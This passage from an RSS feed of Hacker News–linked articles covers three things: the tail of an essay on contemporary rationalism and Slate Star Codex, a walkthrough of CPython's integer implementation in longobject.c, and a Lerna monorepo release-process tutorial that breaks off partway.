won‚Äôt comment on the conclusion. But the logic is specious, and the whole thing is an incredible missed opportunity to help people understand some valuable and interesting ideas. </p><h4>Rationalism as I understand it  </h4><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fe70ba9bd-da54-4126-b597-ae1d556a06d3_1022x408.png"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fe70ba9bd-da54-4126-b597-ae1d556a06d3_1022x408.png" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/e70ba9bd-da54-4126-b597-ae1d556a06d3_1022x408.png&quot;,&quot;height&quot;:408,&quot;width&quot;:1022,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:702783,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null}" alt=""></a><figcaption>Early Modern rationalists ‚Äî Descartes, Spinoza, Leibniz</figcaption></figure></div><p>When I first heard about rationalists I was intensely confused, because in college I took a few different classes that involved reading ‚Äúrationalist‚Äù philosophers from the Early Modern period, and contemporary rationalists‚Äô ideas are totally unlike early modern philosophical rationalists‚Äô ideas.<a id="footnote-anchor-2" href="#footnote-2">2</a> I should also note that contemporary rationalism is both a set of ideas and also a specific community in the Bay Area that, as I understand it, involves polyamory and communal living of some kind. I don‚Äôt have any real knowledge or understanding of the latter and am just talking about ideas. </p><p>Rationalists‚Äô big thing is that the natural human process of cognition is <em>capable</em> of reaching accurate results, but that‚Äôs not really the default mode. And rationalists are not just aware of this ‚Äî they think it‚Äôs a big problem, and they try really hard to push back on it and develop better reasoning skills. </p><p>I think that‚Äôs probably why a rationalist blog is very popular in Silicon Valley. The nature of VC investing or the management of an early-stage startup is that there is incredible monetary value in making correct predictions in the face of imperfect information. Then on top of that, the kinds of recommendations that rationalists give for how to reason better tend to align with engineers‚Äô natural instincts and inclinations:&nbsp;be more bloodless and objective, evaluate claims on the merits in isolation, gather and surface all available facts. </p><p>This thing I did where I tried to <a href="https://www.slowboring.com/p/predictions">list specific predictions with specific probabilities</a> so I can go back and check to see how wrong I was is a rationalist idea. </p><p>But of course, there‚Äôs more to it than predicting. The key to Metz‚Äôs point is that part of the practice of rationalism is that in order to do it effectively, you have to be willing to be impolite. Not necessarily 24 hours a day or anything, but when you‚Äôre in Rationalism Mode you can‚Äôt also ‚Äúread the room.‚Äù A rationalist would say that human psychology is <em>over-optimized</em> for reading the room, and that to get at the truth you need to be willing to deliberately turn off the room-reading portion of your brain and just throw your idea out. </p><p>Compared to the public masses, the biggest difference between rationalists and everyday Americans is almost certainly that <a href="https://www.pewresearch.org/fact-tank/2018/04/25/key-findings-about-americans-belief-in-god/">Americans are very religious</a>. </p><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fe4908e87-8451-4a13-92a1-1bc4c7020586_640x380.png"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fe4908e87-8451-4a13-92a1-1bc4c7020586_640x380.png" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/e4908e87-8451-4a13-92a1-1bc4c7020586_640x380.png&quot;,&quot;height&quot;:380,&quot;width&quot;:640,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:27299,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null}" alt=""></a></figure></div><p>But a quirk of American life is that even though most Americans say they believe in God as described in the Bible, nobody thinks it‚Äôs interesting to argue about this. By contrast, lots of people like to argue about race and gender issues. But in progressive circles, it is common to observe the norm that because the struggle against racism and misogyny is important, it is impolite to dissent from an anti-racist claim or argument unless you have some overwhelmingly important reason for doing so. </p><h4>Rationality vs. manners</h4><p>This exchange between Conor Friedersdorf and Chris Hayes on the merits of arguing about the San Francisco School Board illustrates the progressive norm, upheld here by Hayes.</p><p>To an extent, I disagree with Hayes about this specific case<a id="footnote-anchor-3" href="#footnote-3">3</a>, but I accept the basic force of his logic. Hayes, as a prime time cable television host, has a kind of power in our society that it‚Äôs incumbent on him to wield wisely. And while I think wielding that power wisely entails not lying to people, it is compatible with discretion about what truths one chooses to speak. But even though rationalists will understand the strategic logic of this kind of argument as well (if not better) than most, the <em>practice</em> of rationalism requires setting it aside. </p><p>You see this on display in a post Metz criticizes titled <a href="https://slatestarcodex.com/2017/08/01/gender-imbalances-are-mostly-not-due-to-offensive-attitudes/">‚ÄúGender Imbalances Are Mostly Not Due To Offensive Attitudes.‚Äù</a></p><p>In the (liberal, coastal, urban, very political) circles that I travel, everyone (especially parents) knows and acknowledges that men and women are, on average, different in ways that end up mattering for the distribution of outcomes. But everyone also believes that sexism and misogyny are significant problems in the world, and that the people struggling against those problems are worthy of admiration and praise. So to leap into a conversation about sexism and misogyny yelling <a href="https://pubmed.ncbi.nlm.nih.gov/30206941/">‚ÄúWELL ACTUALLY GIOLLA AND KAJONIUS FIND THAT  SEX DIFFERENCES IN PERSONALITY ARE LARGER IN COUNTRIES WITH MORE GENDER EQUALITY‚Äù</a> would be considered a rude and undermining thing to do. This is just to say that most people are not rationalists ‚Äî they believe that statements can be evaluated on grounds beyond truth and falsity. There is suspicion of the guy who is ‚Äújust asking questions.‚Äù </p><p>Annie Lowrey even published a piece in the Atlantic denouncing the <a href="https://www.theatlantic.com/ideas/archive/2020/07/may-i-introduce-you-facts-man/614827/">‚ÄúFacts Man‚Äù</a> on precisely these terms:  </p><blockquote><p>Sometimes, Facts Man is less about truth than raising questions. Why can‚Äôt Facts Man talk about certain issues in exactly the way he wants to? Why can‚Äôt Facts Man bring up scientific facts relevant to other people‚Äôs humanity without getting called out for it? Why can‚Äôt Facts Man make obscenely offensive conjectures about life-or-death issues? Where‚Äôs the open debate? Why does Facts Man have to genuflect to other peoples‚Äô identity politics? Facts Man himself has no identity politics! He is an individual, as unique as a snowflake, but certainly not as fragile as one.</p></blockquote><p>Personally, I find myself somewhere between Lowrey and Alexander on this. The pure vision of the rationalists and the belief that statements could or should be read devoid of context or purely literally strikes me as untenable. But I think that in the Trump era, journalism as a whole has tilted too far in Lowrey‚Äôs direction, with too much room-reading and groupthink and ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.slowboring.com/p/slate-star-codex">https://www.slowboring.com/p/slate-star-codex</a></em></p>]]>
            </description>
            <link>https://www.slowboring.com/p/slate-star-codex</link>
            <guid isPermaLink="false">hacker-news-small-sites-26132104</guid>
            <pubDate>Sun, 14 Feb 2021 13:08:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Python Internals Serie: Int (Long) Object]]>
            </title>
            <description>
<![CDATA[
Score 12 | Comments 1 (<a href="https://news.ycombinator.com/item?id=26131703">thread link</a>) | @karroum
<br/>
February 14, 2021 | http://ykarroum.com/2021/01/10/intobject/ | <a href="https://web.archive.org/web/*/http://ykarroum.com/2021/01/10/intobject/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <div>
  
  <p><span>10 Jan 2021</span></p><p>In this article, we will read and discuss the implementation details of <em>ints</em> in <em>CPython</em>.</p>

<p>Altough using integers in python is fairly easy :</p>

<figure><pre><code data-lang="python"><span>a</span> <span>=</span> <span>1</span>

<span>b</span> <span>=</span> <span>a</span> <span>+</span> <span>5</span></code></pre></figure>

<p>The implementation file contains more than 5000 code lines.</p>

<p>Since the file contains roughly 116 functions/macros, I‚Äôll probably skip some (most of ?) functions.</p>

<p>Without further ado, let‚Äôs dive into the code !</p>

<h3 id="longobjectc">longobject.c</h3>

<p>First we need to find a starting point, we know that all pythons objects are stored in <code>cpython/Objects</code>.</p>

<p>Unfortunetly, we don‚Äôt seem to have an <code>intobject.c</code> file. That‚Äôs because the underlying C object for python integers is <code>PyLongObject</code>.</p>

<p>The file we‚Äôre interessted in is : <code>longobject.c</code></p>

<p>From now one I will refer to python‚Äôs integers implementation both using <em>integers</em> or <em>longs</em>, which is not technically accurate since in <em>C</em> those are different types.</p>

<p>For the rest of this article, we‚Äôll revisit some of the most used operations/functions related to integers.</p>

<h4 id="medium_valuex">MEDIUM_VALUE(x)</h4>

<figure><pre><code data-lang="c"><span>/* convert a PyLong of size 1, 0 or -1 to an sdigit */</span>
<span>#define MEDIUM_VALUE(x) (assert(-1 &lt;= Py_SIZE(x) &amp;&amp; Py_SIZE(x) &lt;= 1),   \
         Py_SIZE(x) &lt; 0 ? -(sdigit)(x)-&gt;ob_digit[0] :   \
             (Py_SIZE(x) == 0 ? (sdigit)0 :                             \
              (sdigit)(x)-&gt;ob_digit[0]))</span></code></pre></figure>

<p>The comment is pretty explanatory, the macro convert a given <em>long</em> to an <em>sdigit</em>. But what‚Äôs an sdigit ? Well it depends :</p>

<figure><pre><code data-lang="c"><span>#if PYLONG_BITS_IN_DIGIT == 30 </span><span>/* signed variant of digit */</span><span>
</span><span>typedef</span> <span>int32_t</span> <span>sdigit</span>
<span>#elif PYLONG_BITS_IN_DIGIT == 15
</span><span>typedef</span> <span>short</span> <span>sdigit</span><span>;</span> <span>/* signed variant of digit */</span>
<span>#else
#error "PYLONG_BITS_IN_DIGIT should be 15 or 30
#endif</span></code></pre></figure>

<p>The <code>PYLONG_BITS_IN_DIGIT</code> is defined either at configure time or in <code>pyport.h</code>.</p>

<p>We have an assert to protect us from accidently casting a big integer, which is not small enough to fit in an sdigit, to an sdigit, which may result in a loss of information, therefore potentiely issues which can be hard to detect.</p>

<p>Curiously, the assert check that the <em>size</em> of x is bigger than -1, but can be less than 0 ? My guess is that size is unsigned to represent both the size and the sign of the integer, for exemple : <code>PY_SIZE(-15) = -2</code>.
This seems to be confirmed with <code>Py_SIZE(x) &lt; 0 ? -(sdigit)(x)-&gt;ob_digit[0]</code>.</p>

<p><code>ob_digit</code> looks like an array containing our integer. which can be confirmed in the file <code>longintrepr.h</code> :</p>

<figure><pre><code data-lang="c"><span>struct</span> <span>_longobject</span> <span>{</span>
    <span>PyObject_VAR_HEAD</span>
    <span>digit</span> <span>ob_digit</span><span>[</span><span>1</span><span>];</span>
<span>};</span></code></pre></figure>

<p>One curious fact, that I can‚Äôt explain, is the small size of the array (one element ?), maybe it‚Äôs somehow changed at runtime.</p>

<h4 id="is_small_intival">IS_SMALL_INT(ival)</h4>

<figure><pre><code data-lang="c"><span>#define IS_SMALL_INT(ival) (-NSMALLNEGINTS &lt;= (ival) &amp;&amp; (ival) &lt; NSMALLPOSINTS)</span></code></pre></figure>

<p>Pretty straightforward function.</p>

<p><code>NSMALLPOSINTS</code> and <code>NSMALLNEGINTS</code> is defined in the <code>pycore_interp.h</code> file :</p>

<figure><pre><code data-lang="c"><span>/* interpreter state */</span>

<span>#define _PY_NSMALLPOSINTS           257
#define _PY_NSMALLNEGINTS           5</span></code></pre></figure>

<p>To undesrtand why those 2 magic numbers and where this macro is used, let‚Äôs dive into the next function.</p>

<h4 id="static-pyobject--get_small_intsdigit-ival">static PyObject * get_small_int(sdigit ival)</h4>

<figure><pre><code data-lang="c"><span>static</span> <span>PyObject</span> <span>*</span>
<span>get_small_int</span><span>(</span><span>sdigit</span> <span>ival</span><span>)</span>
<span>{</span>
    <span>assert</span><span>(</span><span>IS_SMALL_INT</span><span>(</span><span>ival</span><span>));</span>
    <span>PyInterpreterState</span> <span>*</span><span>interp</span> <span>=</span> <span>_PyInterpreterState_GET</span><span>();</span>
    <span>PyObject</span> <span>*</span><span>v</span> <span>=</span> <span>(</span><span>PyObject</span><span>*</span><span>)</span><span>interp</span><span>-&gt;</span><span>small_ints</span><span>[</span><span>ival</span> <span>+</span> <span>NSMALLNEGINTS</span><span>];</span>
    <span>Py_INCREF</span><span>(</span><span>v</span><span>);</span>
    <span>return</span> <span>v</span><span>;</span>
<span>}</span></code></pre></figure>

<p>This function implements what is commonly known as the <em>Flyweight pattern</em>, as explained here : <a href="https://python-patterns.guide/gang-of-four/flyweight/">https://python-patterns.guide/gang-of-four/flyweight/</a>, the flyweight pattern is used in python to create at the initialisation phase all the integers in the range [-5, 256]. At the runtime, whenever you ask for a number in this range, you‚Äôll always get the <em>same</em> number.</p>

<p>Which can be easily checked :</p>

<figure><pre><code data-lang="python"><span>20</span> <span>+</span> <span>30</span> <span>is</span> <span>50</span> <span># True
</span><span>200</span> <span>+</span> <span>300</span> <span>is</span> <span>500</span> <span># False</span></code></pre></figure>

<p>Those integers objects are stored in the interpreter state.</p>

<p>According to <a href="https://tenthousandmeters.com/blog/python-behind-the-scenes-1-how-the-cpython-vm-works/">https://tenthousandmeters.com/blog/python-behind-the-scenes-1-how-the-cpython-vm-works/</a> :</p>

<blockquote>
  <p>An interpreter state is a group of threads along with the data specific to this group. Threads share such things as loaded modules (sys.modules), builtins (builtins.<strong>dict</strong>) and the import system (importlib).</p>
</blockquote>

<p>Apparently flyweight integers are stored there.</p>

<p>We also use <code>Py_INCREF</code> to increment the reference count of the returned integer, recall that reference counting is what is used by the CPython garbage collector to detect which objects to free (Well not just that, since reference counting alone doesn‚Äôt resolve circular references, but we‚Äôll discuss the <em>gc</em> in more details in future articles).</p>

<h4 id="maybe_small_long">maybe_small_long</h4>

<p>Straitforward function, we check a given integer is small enough to fit into an sdigit, if it‚Äôs the case we downcast it to an sdigit using the <code>MEDIUM_VALUE</code>. After downcasting we check if the integer is in the flyweight range <em>[-5, 257]</em>, if it‚Äôs the case we decrement the referece counting (since we don‚Äôt need two PyLong objects) and we return a reference on the already allocated number.</p>

<h3 id="how-are-longs-created">How are longs created</h3>

<p>Longs are created using the function <code>PyLongObject * _PyLong_New(Py_ssize_t size)</code>, size here refer to the number of digit of the target long.</p>

<figure><pre><code data-lang="c"><span>if</span> <span>(</span><span>size</span> <span>&gt;</span> <span>(</span><span>Py_ssize_t</span><span>)</span><span>MAX_LONG_DIGITS</span><span>)</span> <span>{</span>
	<span>PyErr_SetString</span><span>(</span><span>PyExc_OverflowError</span><span>,</span>
					<span>"too many digits in integer"</span><span>);</span>
	<span>return</span> <span>NULL</span><span>;</span>
<span>}</span></code></pre></figure>

<p>Well, looks like we can‚Äôt have an indefinely big integer, but how big can our integers be ?</p>

<figure><pre><code data-lang="c"><span>#define MAX_LONG_DIGITS \
    ((PY_SSIZE_T_MAX - offsetof(PyLongObject, ob_digit))/sizeof(digit))</span></code></pre></figure>

<p>If you don‚Äôt already know it, <em>offsetof</em> is a <em>C</em> function wich will basicaly return an offset of the member (ob_digit) from the structure (PyLongObject), if you recall correctly, since our struture only contains <code>PyObject_VAR_HEAD</code> and 	<code>digit ob_digit</code>. so the offset is the memorry taken with VAR_HEAD.</p>

<p>So a integer has a maximal size of roughly Py_SSIZE_T_MAx.</p>

<p>According to this answer : <a href="https://stackoverflow.com/a/42777910/14517936">https://stackoverflow.com/a/42777910/14517936</a> <code>Py_SSIZE_T_MAX = sys.maxsize</code>, which is according to the official documentation ( <a href="https://docs.python.org/3/library/sys.html#sys.maxsize">https://docs.python.org/3/library/sys.html#sys.maxsize</a> ) equal to <code>2**31 - 1</code> on 32 bits machine or <code>2**63 - 1</code>.</p>

<p><code>2**63 - 1</code> is a huge number of digits.</p>

<p>You can check this limit yourself by doing :</p>

<figure><pre><code data-lang="python"><span>import</span> <span>sys</span>
<span>10</span><span>**</span><span>sys</span><span>.</span><span>maxsize</span></code></pre></figure>

<p>If the size is fine, we allocate enough memory to store our integer :</p>

<figure><pre><code data-lang="c"><span>result</span> <span>=</span> <span>PyObject_MALLOC</span><span>(</span><span>offsetof</span><span>(</span><span>PyLongObject</span><span>,</span> <span>ob_digit</span><span>)</span> <span>+</span>
						 <span>size</span><span>*</span><span>sizeof</span><span>(</span><span>digit</span><span>));</span>
<span>if</span> <span>(</span><span>!</span><span>result</span><span>)</span> <span>{</span>
	<span>PyErr_NoMemory</span><span>();</span>
	<span>return</span> <span>NULL</span><span>;</span>
<span>}</span></code></pre></figure>

<p>As a good practice you should ALWAYS check that an allocation had correctly been performed, which may not be the case if you don‚Äôt have enough memory for example, your futur self will thank you.</p>

<h3 id="adding-two-integers">Adding two integers</h3>

<figure><pre><code data-lang="c"><span>static</span> <span>PyObject</span> <span>*</span>
<span>long_add</span><span>(</span><span>PyLongObject</span> <span>*</span><span>a</span><span>,</span> <span>PyLongObject</span> <span>*</span><span>b</span><span>)</span>
<span>{</span>
    <span>PyLongObject</span> <span>*</span><span>z</span><span>;</span>

    <span>CHECK_BINOP</span><span>(</span><span>a</span><span>,</span> <span>b</span><span>);</span>

    <span>if</span> <span>(</span><span>Py_ABS</span><span>(</span><span>Py_SIZE</span><span>(</span><span>a</span><span>))</span> <span>&lt;=</span> <span>1</span> <span>&amp;&amp;</span> <span>Py_ABS</span><span>(</span><span>Py_SIZE</span><span>(</span><span>b</span><span>))</span> <span>&lt;=</span> <span>1</span><span>)</span> <span>{</span>
        <span>return</span> <span>PyLong_FromLong</span><span>(</span><span>MEDIUM_VALUE</span><span>(</span><span>a</span><span>)</span> <span>+</span> <span>MEDIUM_VALUE</span><span>(</span><span>b</span><span>));</span>
    <span>}</span>
    <span>if</span> <span>(</span><span>Py_SIZE</span><span>(</span><span>a</span><span>)</span> <span>&lt;</span> <span>0</span><span>)</span> <span>{</span>
        <span>if</span> <span>(</span><span>Py_SIZE</span><span>(</span><span>b</span><span>)</span> <span>&lt;</span> <span>0</span><span>)</span> <span>{</span>
            <span>z</span> <span>=</span> <span>x_add</span><span>(</span><span>a</span><span>,</span> <span>b</span><span>);</span>
            <span>if</span> <span>(</span><span>z</span> <span>!=</span> <span>NULL</span><span>)</span> <span>{</span>
                <span>/* x_add received at least one multiple-digit int,
                   and thus z must be a multiple-digit int.
                   That also means z is not an element of
                   small_ints, so negating it in-place is safe. */</span>
                <span>assert</span><span>(</span><span>Py_REFCNT</span><span>(</span><span>z</span><span>)</span> <span>==</span> <span>1</span><span>);</span>
                <span>Py_SET_SIZE</span><span>(</span><span>z</span><span>,</span> <span>-</span><span>(</span><span>Py_SIZE</span><span>(</span><span>z</span><span>)));</span>
            <span>}</span>
        <span>}</span>
        <span>else</span>
            <span>z</span> <span>=</span> <span>x_sub</span><span>(</span><span>b</span><span>,</span> <span>a</span><span>);</span>
    <span>}</span>
    <span>else</span> <span>{</span>
        <span>if</span> <span>(</span><span>Py_SIZE</span><span>(</span><span>b</span><span>)</span> <span>&lt;</span> <span>0</span><span>)</span>
            <span>z</span> <span>=</span> <span>x_sub</span><span>(</span><span>a</span><span>,</span> <span>b</span><span>);</span>
        <span>else</span>
            <span>z</span> <span>=</span> <span>x_add</span><span>(</span><span>a</span><span>,</span> <span>b</span><span>);</span>
    <span>}</span>
    <span>return</span> <span>(</span><span>PyObject</span> <span>*</span><span>)</span><span>z</span><span>;</span>
<span>}</span></code></pre></figure>

<p>First we check that the two integers are valid.</p>

<figure><pre><code data-lang="c"><span>#define CHECK_BINOP(v,w)                                \
    do {                                                \
        if (!PyLong_Check(v) || !PyLong_Check(w))       \
            Py_RETURN_NOTIMPLEMENTED;                   \
    } while(0)</span></code></pre></figure>

<p>One curious thing you may have noticed is the :</p>

<figure><pre><code data-lang="c"><span>do</span> <span>{</span>
	<span>INSTR</span><span>;</span>
<span>}</span> <span>while</span><span>(</span><span>0</span><span>)</span></code></pre></figure>

<p>Which seems exactly the same as simply :</p>

<figure><pre><code data-lang="c"><span>INST</span><span>;</span></code></pre></figure>

<p>The purpose of doing this is macros in C are not really smart, the <em>preprocessor</em> will simply do a find/replace and hope for the best. The problem with this can be illustrated with the following macro :</p>

<figure><pre><code data-lang="c"><span>#define fct() \
	INSTR1; \
	INSTR2; </span><span>\</span></code></pre></figure>

<p>But what happens if you do :</p>

<figure><pre><code data-lang="c"><span>if</span><span>(</span><span>condition</span><span>)</span>
	<span>fct</span><span>()</span>
<span>else</span>
	<span>INSTR3</span><span>;</span></code></pre></figure>

<p>the preprocessor will replace this with :</p>

<figure><pre><code data-lang="c"><span>if</span><span>(</span><span>condition</span><span>)</span>
	<span>INSTR1</span><span>;</span>
<span>INSTR2</span><span>;</span>
<span>else</span>
	<span>INSTR</span><span>;</span></code></pre></figure>

<p>which is not valid <em>C</em>, since in <em>C</em> if you omit the braces, the if body will only consists of the first instruction which is not what you would expect.</p>

<p>The do while solve this by enclosing all our instructions in one scope.</p>

<p>But why not just use :</p>

<figure><pre><code data-lang="c"><span>{</span>
	<span>INSTR1</span><span>;</span>
	<span>INSTR2</span><span>;</span>
<span>}</span></code></pre></figure>

<p>As far as i know this is simply a syntaxic choice, since writing <code>MACRO();</code> is more natural than <code>MACRO()</code> (not that in the second case we have no semicolon).</p>

<p>The rest is :</p>

<ul>
  <li>if both a and b are negative we return -|a + b|</li>
  <li>if a is negative but not b we compute b - a</li>
  <li>if b is negative and a is positive we compute a - b</li>
  <li>if both are positive we compute |a + b|</li>
</ul>

<p>This looks fairly complicated for a simple a + b, so why all the burden ?</p>

<p>Well recall that in <code>Python</code> integers can be very large (2^63 digits on 64 bits machines), this is achieved by storing the integers in arrays (each element representing a digit).</p>

<p>We dive in the <code>x_add</code> code we see :</p>

<figure><pre><code data-lang="c"><span>for</span> <span>(</span><span>i</span> <span>=</span> <span>0</span><span>;</span> <span>i</span> <span>&lt;</span> <span>size_b</span><span>;</span> <span>++</span><span>i</span><span>)</span> <span>{</span>
        <span>carry</span> <span>+=</span> <span>a</span><span>-&gt;</span><span>ob_digit</span><span>[</span><span>i</span><span>]</span> <span>+</span> <span>b</span><span>-&gt;</span><span>ob_digit</span><span>[</span><span>i</span><span>];</span>
        <span>z</span><span>-&gt;</span><span>ob_digit</span><span>[</span><span>i</span><span>]</span> <span>=</span> <span>carry</span> <span>&amp;</span> <span>PyLong_MASK</span><span>;</span>
        <span>carry</span> <span>&gt;&gt;=</span> <span>PyLong_SHIFT</span><span>;</span>
    <span>}</span>
    <span>for</span> <span>(;</span> <span>i</span> <span>&lt;</span> <span>size_a</span><span>;</span> <span>++</span><span>i</span><span>)</span> <span>{</span>
        <span>carry</span> <span>+=</span> <span>a</span><span>-&gt;</span><span>ob_digit</span><span>[</span><span>i</span><span>];</span>
        <span>z</span><span>-&gt;</span><span>ob_digit</span><span>[</span><span>i</span><span>]</span> <span>=</span> <span>carry</span> <span>&amp;</span> <span>PyLong_MASK</span><span>;</span>
        <span>carry</span> <span>&gt;&gt;=</span> <span>PyLong_SHIFT</span><span>;</span>
    <span>}</span>
    <span>z</span><span>-&gt;</span><span>ob_digit</span><span>[</span><span>i</span><span>]</span> <span>=</span> <span>carry</span><span>;</span></code></pre></figure>

<h2 id="conclusion">Conclusion</h2>
<p>And that‚Äôs it, the <code>long_sub</code> is fairly similar, and you can always (i encourage you to do so) check multiplication and division code.</p>

<p>We rarely stop to think about basic operations like integer operations, the longobject file shows use how complex and optimised long/integers implementation is in python.</p>

</div>





      </div></div>]]>
            </description>
            <link>http://ykarroum.com/2021/01/10/intobject/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26131703</guid>
            <pubDate>Sun, 14 Feb 2021 12:09:44 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Automated release process for (Lerna) monorepo]]>
            </title>
            <description>
<![CDATA[
Score 17 | Comments 2 (<a href="https://news.ycombinator.com/item?id=26131545">thread link</a>) | @kiyanwang
<br/>
February 14, 2021 | https://sudolabs.io/blog/automated-release-process-for-lerna-monorepo | <a href="https://web.archive.org/web/*/https://sudolabs.io/blog/automated-release-process-for-lerna-monorepo">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>The process of publishing (releasing) a new version of software is <em>one of the most important steps</em> in a development lifecycle. In this article, we will take a look at how we can <strong>automate</strong> this in a monorepository managed with <a target="_blank" href="https://lerna.js.org/">lerna</a>.</p><h2>Motivation</h2><p>The most important things in the release process are <em>simplicity</em>, <em>consistency</em>, and <em>clarity</em>. A release process should be <em>straightforward</em>, so everybody on the team can do it <strong>easily by following a clear set of instructions</strong>. During the release process, a lot of things can go wrong - you forget to set a new version, modify the version in any of the <code>package.json</code> files, or even forget to create a new tag or merge hotfixes from the <code>master</code> branch. Therefore, <strong>it's good to clearly define this process and automatize it as much as possible</strong>.</p><h2>Goals</h2><p>The main goal of this article is to <strong>define the release process</strong> for monorepo using Lerna. It consists of the <em>automatic creation of tags, incrementing the version, and changelog generation with the chronological arrangement of changes</em>.</p><h2>Project structure</h2><p>For this project, we will be using a monorepo with two packages/modules: <code>api</code> and <code>frontend</code>. In the root folder, we have packages, root <code>package.json</code>, and Lerna config.</p><pre><code>+-- api
| +-- package.json
| +-- ...
+-- frontend
| +-- package.json
| +-- ...
+-- CHANGELOG.md
+-- lerna.json
+-- package.json
+-- ...</code></pre><p>In this article, we are fixed to monorepo projects managed by <code>lerna</code>. That means that you should be able to use this process with any project using this structure (maybe with some little changes in configs). <strong><em>You can find valuable information in this article even if you are not using this kind of setup</em></strong>.</p><h2>Setup</h2><p>In our release process solution, we are using a <em>combination</em> of <code>GitHub</code>, <code>lerna</code> and <code>lerna-changelog</code>.</p><h3>Lerna</h3><p>Lerna is a library that provides tooling to manage multi-package structure inside a single repository (sometimes called monorepos). Our main usage of <code>lerna</code> is for <em>automatic versioning and tag generation</em>. We are using <code>lerna</code> with the combination of <code>lerna-changelog</code> package which is used to <em>generate a changelog</em> based on the labels attached to PRs merged into the origin.</p><p>In the root of the project run <code>npm i -s -d lerna</code> (we are currently using <code>3.22.1</code>).
Create <code>lerna</code> configuration file (<code>lerna.json</code>).</p><pre><code>{
	"packages": [
		"./*"
	],
	"version": "{{your_current_repository_version}}"
}</code></pre><ul><li>packages - Array of globs to use as package locations (locations of your <strong>not</strong> root <code>package.json</code> files)</li><li>version - the current version of the project (from the root <code>package.json</code>)
More <code>lerna</code> config options can be found <a target="_blank" href="https://github.com/lerna/lerna#lernajson">here</a>.</li></ul><h3>Lerna-changelog</h3><p>In the root of the project run <code>npm i -s -d lerna-changelog</code> (we are currently using <code>1.0.1</code>)
In the root <code>package.json</code> file we need to add config for <code>lerna-changelog</code>. You can map PR labels from Github to more meaningful titles here.</p><pre><code>"changelog": {
	"labels": {
		"Type: Feature": "Features",
		"Type: Bug": "Bug fixes",
		"Type: Enhancement": "Enhancements"
	},
},</code></pre><p>More options can be found in <a target="_blank" href="https://github.com/lerna/lerna-changelog#configuration">lerna-changelog doc</a>.</p><p>For changelog generation, you'll need a <a target="_blank" href="https://docs.github.com/en/github/authenticating-to-github/creating-a-personal-access-token#using-a-token-on-the-command-line">personal access token</a> for the GitHub API with the <code>repo</code> scope for private repositories or just <code>public_repo</code> scope for public repositories.</p><p>You can set the environment variable for the GitHub authentication by running this command:</p><pre><code>export GITHUB_AUTH="&lt;Your Github personal access token&gt;"</code></pre><p>or even better, define this variable in your <code>.bash_profile</code></p><h2>Git workflow</h2><p>To understand this process you have to be familiar with <code>git-flow</code>. In our case, it's based on three main branches:</p><ul><li>develop</li><li>staging</li><li>master</li></ul><p>All <strong>new features or non-critical bug fixes are merged into the develop branch.</strong> When it's time for a new release (typically at the end of the sprint), <strong>all changes from develop are merged into staging branch</strong>, where <strong>we test it</strong> thoroughly if everything is working fine. After that we <strong>merge staging into the master branch</strong>.</p><h2>Release process</h2><p>A new release is introduced by creating a new git tag and bumping versions of packages.
These are done in a semi-automatized way with <a target="_blank" href="https://github.com/lerna/lerna/tree/master/commands/version">lerna</a>.</p><h3>Creating a Release Candidate with changelog</h3><p>Over the time, we figured out these few basic steps to create a release candidate:</p><ol><li>Pull the latest changes from <code>origin</code> to <code>master</code>, <code>staging</code>, <code>develop</code> branches to your local repository</li><li>Checkout into the <code>develop</code> branch and make sure you have all bug fixes from <code>master</code> merged to <code>develop</code></li><li>Run <code>npx lerna-changelog</code> to generate a changelog and append it to the <code>CHANGELOG.md</code></li><li>Commit new <code>CHANGELOG.md</code> on <code>develop</code></li><li>Run <code>npx lerna version</code> and choose the appropriate version number.<ol><li>This will update <code>version</code> properties for all updated packages</li><li>Commit all the changes</li><li>Create a new <code>git tag</code> on the new commit</li></ol></li><li>Push changes to the <code>origin</code></li><li>Merge <code>develop</code> into <code>staging</code> branch</li><li>Push staging to <code>origin</code></li><li>Create a new <em>Pull Request</em> with a base set as <code>master</code> from <code>staging</code> branch</li><li>Copy changes from <code>CHANGELOG.md</code> and attach to the <em>PR</em> body with <code>- [ ]</code> list items to render a <em>TODO</em> list (<code>- [ ]</code> is rendered as a checkbox)</li><li>Let your team know that there is a <em>Release Candidate</em> and wait until they will check every feature / bugfix they've merged</li><li>When all checkboxes (all features / bugfixes) are checked and the <em>PR</em> is approved, <strong>merge</strong> it. <strong><em>Don't squash</em></strong> merge as it might cause conflicts for developed features</li></ol><p>Example of <em>PR</em> from staging to master.
